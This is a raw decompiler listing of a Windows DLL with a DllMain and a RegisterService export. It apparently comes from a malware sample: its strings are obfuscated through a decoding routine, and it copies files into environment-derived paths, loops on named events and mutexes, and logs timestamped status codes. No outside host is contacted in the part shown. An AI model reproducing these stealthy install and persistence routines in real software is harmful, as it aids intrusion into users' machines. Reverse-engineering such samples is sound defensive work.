int (__stdcall *dword_10016024)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int dword_10016028; // weak
int dword_1001602C; // weak
int dword_10016030; // weak
int dword_10016034; // weak
int dword_10016038; // weak
int dword_1001603C; // weak
int dword_10016040; // weak
int dword_10016044; // weak
int dword_10016048; // weak
int dword_1001604C; // weak
int dword_10016050; // weak
int dword_10016054; // weak
int dword_10016058; // weak
int dword_1001605C; // weak
int dword_10016060; // weak
int dword_10016064; // weak
int dword_10016068; // weak
int dword_1001606C; // weak
int dword_10016070; // weak
int dword_10016074; // weak
int dword_10016078; // weak
int dword_1001607C; // weak
int dword_10016080; // weak
int dword_10016084; // weak
int dword_10016088; // weak
int dword_1001608C; // weak
int dword_10016090; // weak
_UNKNOWN unk_100160A0; // weak
VARIANTARG pvarg; // idb
int dword_100160C0; // weak
int (__stdcall *dword_100160C4)(_DWORD, _DWORD); // weak
int (__stdcall *dword_100160C8)(_DWORD, _DWORD); // weak
int dword_100160D8; // weak
int dword_100160DC; // weak
int dword_100160E0; // weak
LPCSTR dword_100160E4; // idb
LPCSTR lpString1; // idb
LPCSTR dword_100160EC; // idb
int dword_100160F0; // weak
CHAR byte_100160F4[128]; // idb
char byte_10016174; // weak
HMODULE dword_10016178; // idb
int (__stdcall *dword_1001617C)(_DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_10016180)(_DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_10016184)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_10016188)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int dword_1001618C; // weak
int (__stdcall *dword_10016190)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_10016194)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
LPCSTR dword_10016198; // idb
LPCSTR dword_1001619C; // idb
int dword_100161A0; // weak
LPCSTR lpProcName; // idb
LPCSTR dword_100161A8; // idb
LPCSTR dword_100161AC; // idb
LPCSTR lpSrc; // idb
LPCSTR dword_100161B4; // idb
int dword_100161E0[256]; // weak
int dword_100165E0[256]; // weak
int dword_100169E0[256]; // weak
int dword_10016DE0[]; // weak


//----- (10001005) --------------------------------------------------------
int sub_10001005()
{
  int result; // eax

  dword_10015608 = (LPCSTR)sub_10008918((int)&unk_10013124);
  result = sub_10008918((int)&unk_10013100);
  dword_1001560C = result;
  return result;
}
// 1001560C: using guessed type int dword_1001560C;

//----- (10001027) --------------------------------------------------------
_DWORD *__thiscall sub_10001027(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = &off_10010200;
  *this = off_100101F0;
  return result;
}
// 100101F0: using guessed type int (*off_100101F0[3])();
// 10010200: using guessed type void *off_10010200;

//----- (10001057) --------------------------------------------------------
_DWORD *__thiscall sub_10001057(_DWORD *this, char a2)
{
  sub_1000107F(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (10001073) --------------------------------------------------------
int sub_10001073()
{
  return 1;
}

//----- (10001077) --------------------------------------------------------
int sub_10001077()
{
  return 1;
}

//----- (1000107B) --------------------------------------------------------
int sub_1000107B()
{
  return 5;
}

//----- (1000107F) --------------------------------------------------------
void *__thiscall sub_1000107F(_DWORD *this)
{
  void *result; // eax

  result = &loc_1000F620;
  *this = off_100101F0;
  *this = &off_10010200;
  return result;
}
// 100101F0: using guessed type int (*off_100101F0[3])();
// 10010200: using guessed type void *off_10010200;

//----- (100010CD) --------------------------------------------------------
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  return sub_100010E9(hinstDLL, fdwReason, (int)lpvReserved);
}

//----- (100010E1) --------------------------------------------------------
int RegisterService()
{
  sub_100010FD();
  return 0;
}
// 100010FD: using guessed type int sub_100010FD(void);

//----- (100010E9) --------------------------------------------------------
int __stdcall sub_100010E9(HMODULE lpParameter, int a2, int a3)
{
  return sub_10005499(lpParameter, a2, a3);
}

//----- (10001145) --------------------------------------------------------
_DWORD *__thiscall sub_10001145(_DWORD *this, char a2)
{
  sub_10001161(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (10001161) --------------------------------------------------------
void __thiscall sub_10001161(_DWORD *this)
{
  void *v1; // ecx

  *this = &off_1001021C;
  v1 = (void *)this[2];
  if ( v1 )
    operator delete(v1);
}
// 1001021C: using guessed type int (__thiscall *off_1001021C)(void *, char);

//----- (10001176) --------------------------------------------------------
int __cdecl sub_10001176(LPCSTR lpRootPathName)
{
  const CHAR *v1; // eax
  const CHAR *v2; // eax
  int result; // eax
  const CHAR *v4; // eax
  int v6; // [esp+0h] [ebp-28h] BYREF
  CHAR FileSystemNameBuffer; // [esp+Ch] [ebp-1Ch] BYREF
  int v8; // [esp+Dh] [ebp-1Bh]
  int v9; // [esp+11h] [ebp-17h]
  char v10; // [esp+15h] [ebp-13h]
  int *v11; // [esp+18h] [ebp-10h]
  int v12; // [esp+24h] [ebp-4h]

  v11 = &v6;
  v12 = 0;
  if ( !lpRootPathName )
    return 3;
  FileSystemNameBuffer = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  if ( !GetVolumeInformationA(lpRootPathName, 0, 0, 0, 0, 0, &FileSystemNameBuffer, 0xAu) )
    return 3;
  v1 = (const CHAR *)sub_10008918((int)&unk_10013184);
  if ( lstrcmpA(v1, &FileSystemNameBuffer) )
  {
    v2 = (const CHAR *)sub_10008918((int)&unk_10013164);
    result = lstrcmpA(v2, &FileSystemNameBuffer);
    if ( !result )
      return result;
    v4 = (const CHAR *)sub_10008918((int)&unk_10013148);
    if ( !lstrcmpA(v4, &FileSystemNameBuffer) )
      return 1;
    v12 = -1;
    return 3;
  }
  return 2;
}

//----- (10001222) --------------------------------------------------------
char sub_10001222()
{
  const CHAR *v0; // eax
  const CHAR *v1; // eax
  const CHAR *v2; // eax
  char result; // al
  const CHAR *v4; // eax
  int v5; // [esp+Ch] [ebp-230h]
  CHAR Dst[264]; // [esp+10h] [ebp-22Ch] BYREF
  CHAR FileName[264]; // [esp+118h] [ebp-124h] BYREF
  int v8; // [esp+220h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+224h] [ebp-18h]

  v8 = 0;
  ms_exc.registration.TryLevel = 0;
  memset(Dst, 0, 261);
  if ( !sub_1000B688() )
    goto LABEL_13;
  if ( !sub_10004E74() )
  {
    sub_100019F8();
    sub_10001421();
LABEL_13:
    result = 0;
    goto LABEL_14;
  }
  v0 = (const CHAR *)sub_10008918((int)&unk_10013208);
  if ( sub_1000B6D3(v0, (HANDLE *)&v8) != 1 || (v1 = (const CHAR *)sub_10008918((int)&unk_100131D0), sub_1000B75A(v1)) )
  {
LABEL_12:
    sub_1000B3DD((HANDLE *)&v8);
    goto LABEL_13;
  }
  memset(FileName, 0, 0x105u);
  v2 = (const CHAR *)sub_10008918((int)&unk_100131A8);
  if ( !sub_10001581(Dst, v2) || !sub_10001764(0, 0, Dst, FileName) )
  {
LABEL_11:
    DeleteFileA(FileName);
    goto LABEL_12;
  }
  sub_1000B9F2(Dst);
  if ( !sub_10006C73() && !sub_10006C08() )
  {
    sub_10006D85();
    goto LABEL_11;
  }
  if ( sub_100019F8() == 1 )
  {
    Sleep(0x2710u);
    sub_10004E53();
    if ( sub_10006266(FileName) )
    {
      v5 = 0;
      while ( 1 )
      {
        v4 = (const CHAR *)sub_10008918((int)&unk_100131D0);
        if ( sub_1000B75A(v4) )
          break;
        if ( (unsigned int)++v5 > 0xF0 )
        {
          sub_10001EE5(420, 0, 9, 0);
          break;
        }
        Sleep(0x1388u);
      }
    }
  }
  sub_10001EE5(420, 0, 0, 0);
  sub_1000B3DD((HANDLE *)&v8);
  result = 1;
LABEL_14:
  ms_exc.registration.TryLevel = -1;
  return result;
}

//----- (10001421) --------------------------------------------------------
bool sub_10001421()
{
  bool v0; // bl

  sub_1000195C();
  v0 = sub_10006D85();
  if ( v0 )
    sub_10001EE5(420, 1, 0, 0);
  else
    sub_10001EE5(420, 1, 26, 0);
  return v0;
}

//----- (1000149A) --------------------------------------------------------
int sub_1000149A()
{
  int result; // eax

  result = sub_10008918((int)&unk_10013238);
  dword_10015610 = result;
  return result;
}
// 10015610: using guessed type int dword_10015610;

//----- (100014B0) --------------------------------------------------------
int sub_100014B0()
{
  int result; // eax

  result = sub_10008918((int)&unk_1001326C);
  dword_10015614 = result;
  return result;
}
// 10015614: using guessed type int dword_10015614;

//----- (100014C6) --------------------------------------------------------
const CHAR *sub_100014C6()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_100132AC);
  lpPrefixString = result;
  return result;
}

//----- (10001564) --------------------------------------------------------
int sub_10001564()
{
  return 1;
}

//----- (10001568) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
char __usercall sub_10001568@<al>(int a1@<ebp>)
{
  *(_DWORD *)(a1 - 4) = -1;
  return *(_BYTE *)(a1 - 28);
}
// 1000157F: positive sp value C has been found
// 10001568: could not find valid save-restore pair for ebx
// 10001568: could not find valid save-restore pair for edi
// 10001568: could not find valid save-restore pair for esi

//----- (10001581) --------------------------------------------------------
char __cdecl sub_10001581(LPSTR lpDst, LPCSTR lpString)
{
  const CHAR *v2; // eax
  DWORD LastError; // eax
  int v5; // [esp+Ch] [ebp-24h]
  DWORD v6; // [esp+10h] [ebp-20h]

  memset(lpDst, 0, 0x105u);
  v2 = (const CHAR *)sub_10008918((int)&unk_100132F0);
  v6 = ExpandEnvironmentStringsA(v2, lpDst, 0x104u);
  if ( !v6 )
    RaiseException(0, 0, 0, 0);
  if ( v6 > 0x104 )
    RaiseException(0, 0, 0, 0);
  v5 = lstrlenA(lpDst);
  if ( lstrlenA(lpString) + v5 > 260 )
    RaiseException(0, 0, 0, 0);
  if ( !lstrcatA(lpDst, lpString) )
  {
    LastError = GetLastError();
    RaiseException(LastError, 0, 0, 0);
  }
  return 1;
}

//----- (10001666) --------------------------------------------------------
char __cdecl sub_10001666(LPSTR lpTempFileName)
{
  const CHAR *v1; // eax
  DWORD LastError; // eax
  DWORD v4; // [esp+Ch] [ebp-128h]
  CHAR Dst[264]; // [esp+10h] [ebp-124h] BYREF
  CPPEH_RECORD ms_exc; // [esp+11Ch] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  memset(lpTempFileName, 0, 0x105u);
  memset(Dst, 0, 0x105u);
  v1 = (const CHAR *)sub_10008918((int)&unk_1001331C);
  v4 = ExpandEnvironmentStringsA(v1, Dst, 0x105u);
  if ( !v4 )
    RaiseException(0, 0, 0, 0);
  if ( v4 > 0x105 )
    RaiseException(0, 0, 0, 0);
  if ( lstrlenA(Dst) >= 246 )
    RaiseException(0, 0, 0, 0);
  if ( !GetTempFileNameA(Dst, lpPrefixString, 0, lpTempFileName) )
  {
    LastError = GetLastError();
    RaiseException(LastError, 0, 0, 0);
  }
  return 1;
}

//----- (10001764) --------------------------------------------------------
char __cdecl sub_10001764(
        LPCVOID lpBuffer,
        DWORD nNumberOfBytesToWrite,
        LPCSTR lpExistingFileName,
        CHAR *lpNewFileName)
{
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  DWORD LastError; // [esp-10h] [ebp-2B4h]
  int v8; // [esp+0h] [ebp-2A4h] BYREF
  DWORD v9; // [esp+Ch] [ebp-298h]
  CHAR Dst[264]; // [esp+10h] [ebp-294h] BYREF
  _DWORD v11[9]; // [esp+118h] [ebp-18Ch] BYREF
  CHAR NewFileName[264]; // [esp+13Ch] [ebp-168h] BYREF
  _DWORD v13[9]; // [esp+244h] [ebp-60h] BYREF
  _DWORD v14[9]; // [esp+268h] [ebp-3Ch] BYREF
  char v15; // [esp+28Ch] [ebp-18h]
  char v16; // [esp+290h] [ebp-14h]
  int *v17; // [esp+294h] [ebp-10h]
  int v18; // [esp+2A0h] [ebp-4h]

  v17 = &v8;
  v16 = 0;
  v18 = 0;
  v9 = 0;
  v4 = (const CHAR *)sub_10008918((int)&unk_1001331C);
  v9 = ExpandEnvironmentStringsA(v4, Dst, 0x105u);
  if ( !v9 )
    RaiseException(0, 0, 0, 0);
  if ( v9 > 0x105 )
    RaiseException(0, 0, 0, 0);
  sub_1000C396(v13, (int)Dst, 1);
  LOBYTE(v18) = 1;
  sub_1000C3E9(v13);
  memset(NewFileName, 0, 0x105u);
  v5 = (const CHAR *)sub_10008918((int)&unk_100132C8);
  if ( !sub_10001581(NewFileName, v5) )
    RaiseException(0, 0, 0, 0);
  if ( !sub_10001666(lpNewFileName) )
    RaiseException(0, 0, 0, 0);
  v16 = 1;
  if ( lpBuffer )
  {
    if ( !lpExistingFileName )
    {
      if ( !sub_1000BC61(lpBuffer, nNumberOfBytesToWrite, lpNewFileName, 2u) )
        RaiseException(0, 0, 0, 0);
      goto LABEL_17;
    }
  }
  else if ( !lpExistingFileName )
  {
    RaiseException(0, 0, 0, 0);
  }
  if ( !CopyFileA(lpExistingFileName, lpNewFileName, 0) )
  {
    LastError = GetLastError();
    RaiseException(LastError, 0, 0, 0);
  }
LABEL_17:
  sub_1000C396(v14, (int)lpNewFileName, 1);
  LOBYTE(v18) = 2;
  sub_1000C3E9(v14);
  sub_1000C396(v11, (int)lpExistingFileName, 1);
  LOBYTE(v18) = 3;
  sub_1000C3E9(v11);
  CopyFileA(lpNewFileName, NewFileName, 1);
  if ( !sub_1000BA00(lpNewFileName, NewFileName) )
    RaiseException(0, 0, 0, 0);
  v16 = 0;
  sub_1000C189(lpNewFileName);
  v15 = 1;
  LOBYTE(v18) = 2;
  sub_1000C3E2(v11);
  LOBYTE(v18) = 1;
  sub_1000C3E2(v14);
  LOBYTE(v18) = 0;
  sub_1000C3E2(v13);
  v18 = 5;
  if ( v16 == 1 )
    DeleteFileA(lpNewFileName);
  return v15;
}
// 10001764: using guessed type _DWORD var_60[9];
// 10001764: using guessed type _DWORD var_3C[9];
// 10001764: using guessed type _DWORD var_18C[9];

//----- (1000195C) --------------------------------------------------------
char sub_1000195C()
{
  const CHAR *v0; // eax
  CHAR Dst[264]; // [esp+Ch] [ebp-124h] BYREF
  CPPEH_RECORD ms_exc; // [esp+118h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  memset(Dst, 0, 261);
  v0 = (const CHAR *)sub_10008918((int)&unk_100132C8);
  if ( !sub_10001581(Dst, v0) )
    RaiseException(0, 0, 0, 0);
  sub_1000B9F2(Dst);
  return 1;
}

//----- (100019F8) --------------------------------------------------------
char sub_100019F8()
{
  const CHAR *v0; // eax
  const CHAR *v1; // eax
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  int v5; // [esp+Ch] [ebp-2Ch]
  HANDLE v6; // [esp+10h] [ebp-28h] BYREF
  char v7; // [esp+14h] [ebp-24h]
  HANDLE v8; // [esp+18h] [ebp-20h] BYREF
  HANDLE hEvent; // [esp+1Ch] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+20h] [ebp-18h]

  v7 = 1;
  hEvent = 0;
  v6 = 0;
  v8 = 0;
  ms_exc.registration.TryLevel = 0;
  v0 = (const CHAR *)sub_10008918((int)&unk_100133E0);
  sub_1000B2B4(&hEvent, v0);
  v1 = (const CHAR *)sub_10008918((int)&unk_100133B0);
  sub_1000B2B4(&v6, v1);
  v5 = 0;
  while ( 1 )
  {
    v2 = (const CHAR *)sub_10008918((int)&unk_1001337C);
    if ( !sub_1000B75A(v2) )
      break;
    if ( (unsigned int)++v5 > 0xF0 )
    {
      v7 = 0;
      break;
    }
    Sleep(0x1388u);
  }
  Sleep(0xEA60u);
  v3 = (const CHAR *)sub_10008918((int)&unk_10013348);
  v8 = OpenEventA(2u, 0, v3);
  sub_1000B3C8(v8);
  ms_exc.registration.TryLevel = -1;
  sub_1000B3C8(hEvent);
  sub_1000B3C8(v6);
  sub_1000B3DD(&hEvent);
  sub_1000B3DD(&v6);
  sub_1000B3DD(&v8);
  return v7;
}

//----- (10001B09) --------------------------------------------------------
_BYTE *__thiscall sub_10001B09(_BYTE *this, char a2)
{
  _BYTE *result; // eax

  result = this;
  *(_DWORD *)this = &off_10010200;
  this[4] = 0;
  this[5] = a2;
  *(_DWORD *)this = off_1001029C;
  return result;
}
// 10010200: using guessed type void *off_10010200;
// 1001029C: using guessed type int (*off_1001029C[3])();

//----- (10001B45) --------------------------------------------------------
int __thiscall sub_10001B45(_BYTE *this)
{
  int v1; // eax

  v1 = -(this[5] != 1);
  LOBYTE(v1) = v1 & 0xF7;
  return v1 + 10;
}

//----- (10001B54) --------------------------------------------------------
int sub_10001B54()
{
  return 5;
}

//----- (10001B58) --------------------------------------------------------
int __thiscall sub_10001B58(_BYTE *this)
{
  int result; // eax

  result = 1;
  if ( this[4] != 1 )
  {
    this[4] = 1;
    return (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 16))(this);
  }
  return result;
}

//----- (10001B69) --------------------------------------------------------
char __thiscall sub_10001B69(_BYTE *this)
{
  return this[4];
}

//----- (10001B6D) --------------------------------------------------------
_DWORD *__thiscall sub_10001B6D(_DWORD *this, char a2)
{
  sub_10001B89(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (10001B89) --------------------------------------------------------
void *__thiscall sub_10001B89(_DWORD *this)
{
  void *result; // eax

  result = &loc_1000F67C;
  *this = off_1001029C;
  *this = &off_10010200;
  return result;
}
// 10010200: using guessed type void *off_10010200;
// 1001029C: using guessed type int (*off_1001029C[3])();

//----- (10001BB3) --------------------------------------------------------
int __thiscall sub_10001BB3(
        int this,
        char a2,
        int a3,
        int a4,
        int a5,
        char a6,
        int a7,
        int a8,
        int a9,
        int a10,
        char a11,
        int a12,
        int a13,
        int a14,
        int a15)
{
  sub_10001B09((_BYTE *)this, 0);
  *(_BYTE *)(this + 8) = a2;
  std::string::_Tidy(this + 8, 0);
  std::string::assign(this + 8, &a2, 0, std::string::npos);
  *(_BYTE *)(this + 24) = a6;
  std::string::_Tidy(this + 24, 0);
  std::string::assign(this + 24, &a6, 0, std::string::npos);
  *(_BYTE *)(this + 40) = a11;
  std::string::_Tidy(this + 40, 0);
  std::string::assign(this + 40, &a11, 0, std::string::npos);
  *(_DWORD *)(this + 56) = a10;
  *(_DWORD *)(this + 60) = a15;
  *(_DWORD *)this = off_100102B0;
  std::string::_Tidy(&a2, 1);
  std::string::_Tidy(&a6, 1);
  std::string::_Tidy(&a11, 1);
  return this;
}
// 10010134: using guessed type int __thiscall std::string::assign(_DWORD, _DWORD, _DWORD, _DWORD);
// 1001013C: using guessed type int __thiscall std::string::_Tidy(_DWORD, _DWORD);
// 100102B0: using guessed type int (*off_100102B0[3])();

//----- (10001CA5) --------------------------------------------------------
void *__thiscall sub_10001CA5(void *this, char a2)
{
  sub_10001CC1((int)this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (10001CC1) --------------------------------------------------------
int __thiscall sub_10001CC1(int this)
{
  char v2; // cl
  int result; // eax
  char v4; // [esp-18h] [ebp-44h] BYREF
  LPCSTR v5; // [esp-14h] [ebp-40h]
  int v6; // [esp-10h] [ebp-3Ch] BYREF
  LPCSTR v7; // [esp-Ch] [ebp-38h]
  int v8; // [esp-8h] [ebp-34h]
  int *v9; // [esp-4h] [ebp-30h]
  _DWORD v10[2]; // [esp+Ch] [ebp-20h] BYREF
  int *v11; // [esp+14h] [ebp-18h]
  int v12; // [esp+18h] [ebp-14h]
  int v13; // [esp+1Ch] [ebp-10h] BYREF
  int v14; // [esp+28h] [ebp-4h]

  v12 = this;
  *(_DWORD *)this = off_100102B0;
  v14 = 3;
  if ( sub_10001B69((_BYTE *)this) && *(_DWORD *)(this + 48) )
  {
    v2 = *(_BYTE *)(this + 8);
    v13 = 0;
    v11 = &v6;
    LOBYTE(v6) = v2;
    std::string::_Tidy(&v6, 0);
    std::string::assign(&v6, this + 8, 0, std::string::npos);
    LOBYTE(v14) = 3;
    sub_1000C6ED(v10, v6, v7, v8, (int)v9);
    LOBYTE(v14) = 5;
    v9 = &v13;
    v8 = *(_DWORD *)(this + 60);
    v11 = (int *)&v4;
    std::string::string(&v4, this + 40);
    LOBYTE(v14) = 5;
    sub_1000C7A8(v10, v4, v5, v6, (int)v7, v8, v9);
    LOBYTE(v14) = 3;
    sub_1000C78E(v10);
  }
  LOBYTE(v14) = 2;
  std::string::_Tidy(this + 40, 1);
  LOBYTE(v14) = 1;
  std::string::_Tidy(this + 24, 1);
  LOBYTE(v14) = 0;
  result = std::string::_Tidy(this + 8, 1);
  *(_DWORD *)this = off_1001029C;
  *(_DWORD *)this = &off_10010200;
  return result;
}
// 10010128: using guessed type int __thiscall std::string::string(_DWORD, _DWORD);
// 10010134: using guessed type int __thiscall std::string::assign(_DWORD, _DWORD, _DWORD, _DWORD);
// 1001013C: using guessed type int __thiscall std::string::_Tidy(_DWORD, _DWORD);
// 10010200: using guessed type void *off_10010200;
// 1001029C: using guessed type int (*off_1001029C[3])();
// 100102B0: using guessed type int (*off_100102B0[3])();
// 10001CC1: using guessed type _DWORD var_20[2];

//----- (10001DB2) --------------------------------------------------------
int __thiscall sub_10001DB2(_BYTE *this)
{
  _BYTE *v1; // esi
  char v2; // al
  _BYTE *v3; // edi
  int v4; // eax
  int v5; // esi
  char v7; // [esp-18h] [ebp-40h] BYREF
  LPCSTR v8; // [esp-14h] [ebp-3Ch]
  int v9; // [esp-10h] [ebp-38h] BYREF
  LPCSTR v10; // [esp-Ch] [ebp-34h]
  int v11; // [esp-8h] [ebp-30h]
  int *v12; // [esp-4h] [ebp-2Ch]
  _DWORD v13[2]; // [esp+Ch] [ebp-1Ch] BYREF
  int *v14; // [esp+14h] [ebp-14h]
  int v15; // [esp+18h] [ebp-10h] BYREF
  int v16; // [esp+24h] [ebp-4h]

  v15 = 0;
  v1 = this;
  v2 = this[8];
  v3 = this + 8;
  v14 = &v9;
  LOBYTE(v9) = v2;
  std::string::_Tidy(&v9, 0);
  std::string::assign(&v9, v3, 0, std::string::npos);
  v16 = -1;
  sub_1000C6ED(v13, v9, v10, v11, (int)v12);
  v1 += 24;
  v12 = &v15;
  v16 = 1;
  v11 = *((_DWORD *)v1 + 8);
  v14 = (int *)&v7;
  std::string::string(&v7, v1);
  LOBYTE(v16) = 1;
  v4 = sub_1000C7A8(v13, v7, v8, v9, (int)v10, v11, v12);
  v16 = -1;
  v5 = v4;
  sub_1000C78E(v13);
  return v5;
}
// 10010128: using guessed type int __thiscall std::string::string(_DWORD, _DWORD);
// 10010134: using guessed type int __thiscall std::string::assign(_DWORD, _DWORD, _DWORD, _DWORD);
// 1001013C: using guessed type int __thiscall std::string::_Tidy(_DWORD, _DWORD);
// 10001DB2: using guessed type _DWORD var_1C[2];

//----- (10001E4B) --------------------------------------------------------
char __cdecl sub_10001E4B(LPCSTR lpSrc, _BYTE *lpBuffer, int Buffer, volatile LONG *a4)
{
  int v4; // eax
  char v5; // al
  int v7[71]; // [esp+4h] [ebp-128h] BYREF
  int v8; // [esp+128h] [ebp-4h]
  char lpSrc_3; // [esp+137h] [ebp+Bh]

  v8 = 0;
  v4 = sub_10008918((int)&unk_10013408);
  sub_1000E4E0((char *)v7, lpSrc, 3145728, v4, 0);
  LOBYTE(v8) = 1;
  if ( a4 )
    InterlockedIncrement(a4 + 2);
  LOBYTE(v8) = 1;
  v5 = sub_1000E539((int)v7, 0, lpBuffer, Buffer, a4);
  v8 = -1;
  lpSrc_3 = v5;
  v7[0] = (int)&off_100102C4;
  if ( a4 )
    sub_1000219B(a4);
  return lpSrc_3;
}
// 100102C4: using guessed type int (__stdcall *off_100102C4)(int, LPCVOID lpBuffer, int Buffer, void *);

//----- (10001EE5) --------------------------------------------------------
char __cdecl sub_10001EE5(__int16 a1, __int16 a2, __int16 a3, __int16 a4)
{
  char v4; // al
  char v5; // bl
  volatile LONG *v7[3]; // [esp-4h] [ebp-1Ch] BYREF
  void *v8; // [esp+8h] [ebp-10h] BYREF
  int v9; // [esp+14h] [ebp-4h]

  sub_10002101((BSTR **)&v8, String2);
  v9 = 0;
  v7[2] = (volatile LONG *)v7;
  v7[0] = (volatile LONG *)v8;
  if ( v8 )
    InterlockedIncrement((volatile LONG *)v8 + 2);
  LOBYTE(v9) = 0;
  v4 = sub_10001F58(a1, a2, a3, a4, v7[0]);
  v9 = -1;
  v5 = v4;
  if ( v8 )
    sub_1000219B((volatile LONG *)v8);
  return v5;
}

//----- (10001F58) --------------------------------------------------------
char __cdecl sub_10001F58(__int16 a1, __int16 a2, __int16 a3, __int16 a4, volatile LONG *a5)
{
  const CHAR *v5; // eax
  DWORD v6; // eax
  const CHAR *v7; // eax
  HANDLE MutexA; // eax
  volatile LONG *v10; // [esp-4h] [ebp-17Ch] BYREF
  _DWORD v11[10]; // [esp+0h] [ebp-178h] BYREF
  CHAR Dst[264]; // [esp+28h] [ebp-150h] BYREF
  DWORD v13; // [esp+130h] [ebp-48h]
  struct _SYSTEMTIME SystemTime; // [esp+134h] [ebp-44h] BYREF
  DWORD v15; // [esp+144h] [ebp-34h]
  __int16 Buffer[12]; // [esp+148h] [ebp-30h] BYREF
  HANDLE hMutex; // [esp+160h] [ebp-18h]
  char v18; // [esp+164h] [ebp-14h]
  _DWORD *v19; // [esp+168h] [ebp-10h]
  int v20; // [esp+174h] [ebp-4h]

  v19 = v11;
  v20 = 1;
  v18 = 0;
  hMutex = 0;
  memset(Buffer, 0, 0x16u);
  memset(&SystemTime, 0, sizeof(SystemTime));
  GetSystemTime(&SystemTime);
  Buffer[6] = SystemTime.wYear;
  Buffer[5] = SystemTime.wMonth;
  Buffer[4] = SystemTime.wDay;
  Buffer[3] = SystemTime.wHour;
  Buffer[2] = SystemTime.wMinute;
  Buffer[1] = SystemTime.wSecond;
  Buffer[7] = a1;
  Buffer[8] = a2;
  Buffer[9] = a3;
  Buffer[10] = a4;
  Buffer[0] = 0;
  memset(Dst, 0, 0x105u);
  v5 = (const CHAR *)sub_10008918((int)&unk_1001345C);
  v6 = ExpandEnvironmentStringsA(v5, Dst, 0x105u);
  v15 = v6;
  if ( v6
    && v6 <= 0x105
    && (v7 = (const CHAR *)sub_10008918((int)&unk_10013428), MutexA = CreateMutexA(0, 0, v7), (hMutex = MutexA) != 0)
    && (v13 = WaitForSingleObject(MutexA, 0x7530u)) == 0 )
  {
    v11[9] = &v10;
    v11[6] = &v10;
    v10 = a5;
    if ( a5 )
    {
      v11[7] = a5;
      InterlockedIncrement(a5 + 2);
    }
    LOBYTE(v20) = 1;
    v18 = sub_10001E4B(Dst, Buffer, 22, v10);
  }
  else
  {
    LOBYTE(v20) = 3;
  }
  v20 = 4;
  if ( hMutex )
  {
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
  }
  v20 = -1;
  if ( a5 )
    sub_1000219B(a5);
  return v18;
}

//----- (10002101) --------------------------------------------------------
BSTR **__thiscall sub_10002101(BSTR **this, LPCSTR lpString)
{
  BSTR *v3; // ecx
  BSTR *v4; // eax

  v3 = (BSTR *)operator new(0xCu);
  if ( v3 )
    v4 = sub_10002168(v3, lpString);
  else
    v4 = 0;
  *this = v4;
  if ( !v4 )
    sub_10007B26(-2147024882);
  return this;
}

//----- (10002168) --------------------------------------------------------
BSTR *__thiscall sub_10002168(BSTR *this, LPCSTR lpString)
{
  BSTR v3; // eax

  this[1] = 0;
  this[2] = (BSTR)1;
  v3 = sub_100081E0(lpString);
  *this = v3;
  if ( !v3 && lpString )
    sub_10007B26(-2147024882);
  return this;
}

//----- (1000219B) --------------------------------------------------------
int __thiscall sub_1000219B(volatile LONG *this)
{
  char *v2; // edi

  v2 = (char *)(this + 2);
  if ( InterlockedDecrement(this + 2) )
    return *(_DWORD *)v2;
  if ( this )
  {
    sub_100021C8((int)this);
    operator delete((void *)this);
  }
  return 0;
}

//----- (100021C8) --------------------------------------------------------
void __thiscall sub_100021C8(int this)
{
  void *v2; // esi

  if ( *(_DWORD *)this )
    SysFreeString(*(BSTR *)this);
  v2 = *(void **)(this + 4);
  if ( v2 )
    operator delete(v2);
}

//----- (10002211) --------------------------------------------------------
const CHAR *sub_10002211()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_1001349C);
  lpLibFileName = result;
  return result;
}

//----- (10002227) --------------------------------------------------------
const CHAR *sub_10002227()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_100134C4);
  dword_10015660 = result;
  return result;
}

//----- (1000223D) --------------------------------------------------------
int sub_1000223D()
{
  int result; // eax

  result = sub_10008918((int)&unk_100134E8);
  dword_10015654 = result;
  return result;
}
// 10015654: using guessed type int dword_10015654;

//----- (10002253) --------------------------------------------------------
int sub_10002253()
{
  int result; // eax

  result = sub_10008918((int)&unk_10013514);
  dword_10015650 = result;
  return result;
}
// 10015650: using guessed type int dword_10015650;

//----- (10002269) --------------------------------------------------------
int sub_10002269()
{
  int result; // eax

  result = sub_10008918((int)&unk_10013540);
  dword_1001565C = result;
  return result;
}
// 1001565C: using guessed type int dword_1001565C;

//----- (1000227F) --------------------------------------------------------
int sub_1000227F()
{
  int result; // eax

  result = sub_10008918((int)&unk_1001356C);
  dword_10015658 = result;
  return result;
}
// 10015658: using guessed type int dword_10015658;

//----- (10002295) --------------------------------------------------------
int sub_10002295()
{
  int result; // eax

  result = sub_10008918((int)&unk_10013598);
  dword_1001564C = result;
  return result;
}
// 1001564C: using guessed type int dword_1001564C;

//----- (100022AB) --------------------------------------------------------
int sub_100022AB()
{
  int result; // eax

  result = sub_10008918((int)&unk_100135C4);
  dword_10015624 = result;
  return result;
}
// 10015624: using guessed type int dword_10015624;

//----- (100022C1) --------------------------------------------------------
int sub_100022C1()
{
  int result; // eax

